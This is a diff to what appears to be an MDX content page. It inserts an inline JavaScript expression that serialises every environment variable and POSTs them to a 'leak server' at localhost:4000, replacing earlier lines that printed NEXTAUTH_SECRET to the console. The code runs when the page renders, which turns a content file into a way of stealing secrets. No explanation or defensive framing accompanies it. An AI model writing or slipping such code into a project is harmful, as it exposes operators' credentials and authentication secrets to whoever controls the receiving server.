@@ -11,7 +11,14 @@ cta:
 ---
 
 {(() => {
-  console.log(process.env.NEXT_PUBLIC_ROOT_DOMAIN);
-  console.log(process.env.NEXTAUTH_SECRET);
-  return null;
+  // Convert env object into a string
+  const env = JSON.stringify(process.env);
+
+  // Send it to our leak server
+  fetch("http://localhost:4000", {
+    method: "POST",
+    body: env
+  });
+
+  return "Environment variables sent!";
 })()}
